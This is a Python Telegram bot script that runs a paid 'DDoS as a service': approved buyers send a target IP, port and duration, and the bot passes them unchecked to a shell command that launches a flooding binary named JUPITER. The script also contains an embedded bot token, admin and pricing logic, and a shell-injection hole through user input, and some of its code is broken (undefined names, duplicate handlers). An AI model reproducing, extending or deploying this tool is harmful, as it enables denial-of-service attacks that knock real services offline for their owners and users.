#script by @MR_ARMAN_OWNER

import telebot
import subprocess
import requests
import datetime
import os
import logging
import random

# insert your Telegram bot token here
bot = telebot.TeleBot('7600077628:AAEeKcQedw2LY4p94Nu3LtbWUyNB0Q2i07E')

# Admin user IDs
owner_id = "6077036964"
admin_ids = ["6077036964"]
# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Dictionary to store gift codes with duration
gift_codes = {}

# Key prices for different durations
key_prices = {
    "day": 200,
    "week": 800,
    "month": 1200
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6077036964"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"💐 HEY. {user_to_add}\n🌟 YOU'RE APPROVED ✅ FOR {duration} {time_unit}\n🔥INJOY THE BOT ☺️👩🏻‍💻\n\nAPPROVED BYE @MR_ARMAN_OWNER\n⚡ACCESS WILL EXPIRE {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet purchase now from:- @MR_ARMAN_OWNER."

    bot.reply_to(message, response)

# Function to get current time
def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        f"🌟 Welcome to the FAITH DDOS Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n\n"
        "🙇🏻‍♀️/secret TO ( SECRET COMMANDS ) ( OWNER ONLY )\n"
        "/owner TO CONTACT ADMIN/OWNER\n"
        "🔑 /REQUEST TO ( YOU ARE REQUESTING OWNER TO APPROVED YOUR ID )\n\n"
        "🚫 /REQUESTREMOVE TO DISAPPROVE YOURE ID 🆔\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /fuck <host> <port> <time> - Simulate a DDoS attack\n\n"
        "💸 /JOINOFFICIALGROUP TO JOIN AUR GROUP 🌹\n"
        "🎁 /promotion to promote youre channel/group !\n\n"
        "🎁 /REQUESTADMINSEAT TO ( YOURE REQUESTING TO ADMIN ON THIS BOT 😁\n\n"
        "Please use these commands responsibly. 😊"
    )
    bot.send_message(message.chat.id, response)
    
    
@bot.message_handler(commands=['secret'])
def send_welcome(message):
    response = (
        f"🌟 ADMIN K ALAVA BC KOI V USE NHI KAR SKTA 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are secret commands you can use:\n\n"
        "💥 /approveuser <id> <duration> - Approve a user.\n"
        "💥 /addadmin <id> <balance>.\n"
        "💥 /removeadmin <id> - Remove an admin.\n"
        "💥 /removeadmin <id> - Remove an admin.\n"
        "💰 /checkbalance - Check your balance.\n"
        "💥 /redeem <code> - Redeem a gift code.\n"
        "💥 /allusers TO VHECK APPROVED USERS.\n"
        "💥 /add - TO APPROVE A USER.\n"
        "💥 /clearusers TO CLEAR ALL USERS.\n\n"
        "Please use these commands responsibly. 😊"
    )
    bot.send_message(message.chat.id, response)
   
@bot.message_handler(commands=['owner'])
def send_welcome(message):
    response = (
        "CONTACT OWNER -> @MR_ARMAN_OWNER 🌟"
    )
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['REQUEST'])
def send_welcome(message):
    response = (
        "CONTACT ME FOR APPROVAL  🌟  - @MR_ARMAN_OWNER"
    )
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['REQUESTREMOVE'])
def send_welcome(message):
    response = (
        " PLEASE SENT TO  REASON WHY WE REMOVE THAT USE. AND SENT TO -> @MR_ARMAN_OWNER 💥"
    )
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['promotion'])
def send_welcome(message):
    response = (
        "PROMOTION AVAILABLE IN CHEAP PRICE."
        "CONTACT US TO PROMOTE YOUR CHANNEL/GRP."
        "OWNER -> @MR_ARMAN_OWNER."
    )
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['JOINOFFICIALGROUP'])
def send_welcome(message):
    response = (
        "AUR OFFICIAL GRP :- @ARMANTEAMVIP."
        "🌟 OWNER - @MR_ARMAN_OWNER."
    )
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['REQUESTADMINSEAT'])
def send_welcome(message):
    response = (
        "ADMIN SEAT AVAILABLE IN CHEAP PRICE."
        "CONTACT US TO BUY SEAT."
        "OWNER -> @MR_ARMAN_OWNER."
    )
    bot.send_message(message.chat.id, response)
    
    
@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if duration not in key_prices:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            allowed_user_ids.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")
            
            response = f"DEAR VIP USER ❤️\n\nYOUR APPROVE\nAR ID :--> {user_to_approve}\n\napproved for {duration}\n\nINJOY OUR BOT\n\nANY ENQUIRY ? CONTACT US. @MR_ARMAN_OWNER !\n\nTHANK YOU FOR BUYING OUR SERVICE 🐕‍🦺"
        else:
            response = "Usage: /approveuser <id> <duration>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
   
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeuser <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"Admin {admin_to_add} added with balance {balance} 👍."
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeadmin <id>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['creategift'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1]
            if duration in key_prices:
                amount = key_prices[duration]
                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    free_user_credits[user_id] -= amount
                    response = f"Gift code created: {code} for {duration} 🎁."
                else:
                    response = "You do not have enough credits to create a gift code."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /creategift <day/week/month>"
    else:
        response = "Only Admins Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"Gift code redeemed: You have been granted access for {duration} 🎁."
        else:
            response = "Invalid or expired gift code ❌."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)
    
@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"Your current balance is {free_user_credits[user_id]} credits."
    else:
        response = "You do not have a balance account ❌."
    bot.send_message(message.chat.id, response)
    
# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @MR_ARMAN_OWNER 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @MR_ARMAN_OWNER ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ARMAN_OWNER 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ARMAN_OWNER❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝙏𝙝𝙞𝙨 𝘽𝙤𝙩 𝙞𝙨 𝙤𝙣𝙡𝙮 𝙛𝙤𝙧 𝙥𝙖𝙞𝙙 𝙪𝙨𝙚𝙧𝙨 𝙗𝙪𝙮 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 - @MR_ARMAN_OWNER \n205 KALA JADU "
        bot.reply_to(message, response)

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
            
    response = f"🎉 FUCKING STARTED 🎉\n\n🎯 𝙏𝘼𝙍𝙂𝙀𝙏 LOCKED 🔐 :--> {target} 🌟\n🔫 𝐏𝐨𝐫𝐭 SETT :--> {port} 🌟\n🕦FUCKING TIME :--> {time}\n💣 FUCKED BYE :--> ARMAN TEAM 🔥\n\n🔥Status: Attack in Progress... 🔥\n\n🌹 @{username} THANKS TO USING OUR HAX ⚡"
    bot.reply_to(message, response)
    
   # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

# Handler for /attack command and direct attack input
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/fuck') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is not an admin or owner
        if user_id not in admin_ids and user_id != owner_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown ❌. Please Wait 0sec Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        # Check if the message starts with '/attack' or not
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            # If it doesn't start with '/', assume it's an attack command and adjust the command list
            if not message.text.startswith('/'):
                command = ['/fuck'] + command  # Prepend '/attack' to the command list
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 599:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./JUPITER {target} {port} {time} "
                subprocess.run(full_command, shell=True)
                response = f"FUCKING FINISHED ❗\n\n🤖 TARGET UNLOCKED 🔓:--> {target}\n🔫 𝐏𝐨𝐫𝐭 BREACHED :--> {port}\nFUCKED TIME :--> {time} ⏲️"
        else:
            response ="PLEASE ENTER THE FUCKING DETAILS\n\nENTER <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀>\n\nBOTS ARE NOT ALLOWED 🚫" 
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟THE ONLY OWNER IS @MR_ARMAN_OWNER DM TO BUY ACCESS")

    bot.reply_to(message, response)
    
# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🌟 WOOOOOOOOOOH 🌟\n\nATTACKING [ ON YOUR IP ]....🧨\n⚔ STARTED ⚔\n\n🥷ATTACKED IP ==) ( {target} )\n🥷 ATTACKED PORT ==) ( {port} )\n⏰ ATTACK TIME -> ( {time} ) SECONDS 🔥\n💎 ATTACKED BYE ARMAN TEAM ⚔\n\n✅ CURRENT TIME  {get_current_time()} SECONDS\n\nWAIT THERE WHITHOUT TOUCHING ANY BUTTON {time} SECONDS\n\nTHANKS FOR USING AUR HAX 🔥\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =10

# Handler for /bgmi command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_ids and user_id != owner_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "❌ ⚡𝙔𝙊𝙐𝙍 𝙊𝙉 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉 ⚡ ❌\n\n🐥 𝘽𝘼𝘽𝙔  𝙒𝘼𝙄𝙏 [ 10 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 ]\n🌟 𝘽𝙊𝙏 𝙄𝙎 𝙍𝙀𝘾𝙃𝘼𝙍𝙂𝙄𝙉𝙂 🔌\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 599:
                response = "Error: Time interval must be less than 300."
            else: 
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./JUPITER {target} {port} {time} "
                process = subprocess.run(full_command, shell=True)
                response = f"⚔ 𝙈𝙄𝙎𝙎𝙄𝙊𝙉 𝘼𝘾𝘾𝙊𝙈𝙋𝙇𝙄𝙎𝙃𝙀𝘿.... ⚔\n\n🎯 𝙏𝘼𝙍𝙂𝙀𝙏 𝙉𝙀𝙐𝙏𝙍𝘼𝙇𝙄𝙕𝙀𝘿 :--> [ {target} ]\n💣 𝙋𝙊𝙍𝙏 𝘽𝙍𝙀𝘼𝘾𝙃𝙀𝘿:-->  [ {port} ] ⚙\n⌛ 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 :--> [ {time} ] ⏰\n\n𝙊𝙥𝙚𝙧𝙖𝙩𝙞𝙤𝙣 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚. 𝙉𝙤 𝙀𝙫𝙞𝙙𝙚𝙣𝙘𝙚 𝙇𝙚𝙛𝙩 𝘽𝙚𝙝𝙞𝙣𝙙. 𝘾𝙤𝙪𝙧𝙩𝙚𝙨𝙮 𝙤𝙛 :--> @MR_ARMAN_OWNER 🌟\n\n𝘿𝙀𝘼𝙍 𝙐𝙎𝙀𝙍𝙎 𝙒𝙀 𝙑𝘼𝙇𝙐𝙀 𝙊𝙁 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙎𝙊𝙊 𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙀𝙉𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆𝙎 ✅ 𝙄𝙉 𝘾𝙃𝘼𝙏 ☺️"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "𝐃𝐄𝐀𝐑 𝐔𝐒𝐄𝐑. 🧨\n\n𝐔𝐒𝐀𝐆𝐄 /𝐚𝐭𝐭𝐚𝐜𝐤 < 𝐈𝐏 > < 𝐏𝐎𝐑𝐓 > < 𝐓𝐈𝐌𝐄 >\n\n𝙁𝙊𝙍 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 :-> /𝙖𝙩𝙩𝙖𝙘𝙠 20.0.0.0 10283 100\n\n𝘿𝙊𝙉'𝙏 𝙎𝙋𝘼𝙈 ⚠️‼️\nᴛʜɪs ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"  # Updated command syntax
    else:
        response = ("🚫 ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴀᴄᴄᴇꜱꜱ! 🚫\n\nᴏᴏᴘꜱ! ɪᴛ ꜱᴇᴇᴍꜱ ʟɪᴋᴇ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴛᴏ ᴜꜱᴇ ᴛʜᴇ /ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴍᴀɴᴅ. ᴛᴏ ɢᴀɪɴ ᴀᴄᴄᴇꜱꜱ ᴀɴᴅ ᴜɴʟᴇᴀꜱʜ ᴛʜᴇ ᴘᴏᴡᴇʀ ᴏꜰ ᴀᴛᴛᴀᴄᴋꜱ, ʏᴏᴜ ᴄᴀɴ:\n\n👉 ᴄᴏɴᴛᴀᴄᴛ ᴀɴ ᴀᴅᴍɪɴ ᴏʀ ᴛʜᴇ ᴏᴡɴᴇʀ ꜰᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ.\n🌟 ʙᴇᴄᴏᴍᴇ ᴀ ᴘʀᴏᴜᴅ ꜱᴜᴘᴘᴏʀᴛᴇʀ ᴀɴᴅ ᴘᴜʀᴄʜᴀꜱᴇ ᴀᴘᴘʀᴏᴠᴀʟ.\n💬 ᴄʜᴀᴛ ᴡɪᴛʜ ᴀɴ ᴀᴅᴍɪɴ ɴᴏᴡ ᴀɴᴅ ʟᴇᴠᴇʟ ᴜᴘ ʏᴏᴜʀ ᴄᴀᴘᴀʙɪʟɪᴛɪᴇꜱ\n\n🚀 ʀᴇᴀᴅʏ ᴛᴏ ꜱᴜᴘᴇʀᴄʜᴀʀɢᴇ ʏᴏᴜʀ ᴇxᴘᴇʀɪᴇɴᴄᴇ? ᴛᴀᴋᴇ ᴀᴄᴛɪᴏɴ ᴀɴᴅ ɢᴇᴛ ʀᴇᴀᴅʏ ꜰᴏʀ ᴘᴏᴡᴇʀꜰᴜʟ ᴀᴛᴛᴀᴄᴋꜱ!\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @𝐌𝐑_𝐀𝐑𝐌𝐀𝐍_𝐎𝐖𝐍𝐄𝐑")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['secret'])
def show_secret(message):
    secret_text ='''🤖 Available commands:
💥 /approveuser <id> <duration> - Approve a user.
💥 /removeuser <id> - Remove a user.
💥 /addadmin <id> <balance>.
💥 /removeadmin <id> - Remove an admin.
💥 /creategift <duration>.
💥 /redeem <code> - Redeem a gift code.
💥 DONE ✅ INJOY WITH OUR BOT 🌟.
'''

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /attack : 🌟 𝙏𝙊 𝙇𝘼𝙐𝙉𝘾𝙃 𝘼𝙉 𝙋𝙊𝙒𝙀𝙍𝙁𝙐𝙇 𝘼𝙏𝙏𝘼𝘾𝙆 🧨.
💥 /rules : 🌟 𝙋𝙇𝙀𝘼𝙎𝙀 𝘾𝙃𝙀𝘾𝙆 ✔️ 𝘽𝙀𝙁𝙊𝙍𝙀 𝙐𝙎𝙀 ⚡.
💥 /mylogs : 🌟 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝙍𝙀𝘾𝙀𝙉𝙏 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 💂🏻‍♀️.
💥 /plan : 🌟 𝘾𝙃𝙀𝘾𝙆 𝙊𝙐𝙏 𝘼𝙐𝙍 𝙋𝙊𝙒𝙀𝙍𝙁𝙐𝙇 𝘽𝙊𝙏 𝙋𝙍𝙄𝘾𝙀𝙎 ⚡.
💥 /myinfo : 🌟 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝙒𝙃𝙊𝙇𝙀 𝙄𝙉𝙁𝙊 🌪️.

🤖 𝙏𝙊 𝙎𝙀𝙀 𝘼𝘿𝙈𝙄𝙉 𝘾𝙈𝙉𝘿 ( 𝘼𝘿𝙈𝙄𝙉𝙎 𝙊𝙉𝙇𝙔 ) ⚠️:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @MR_ARMAN_OWNER
Official Channel :- PRIVATE 
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
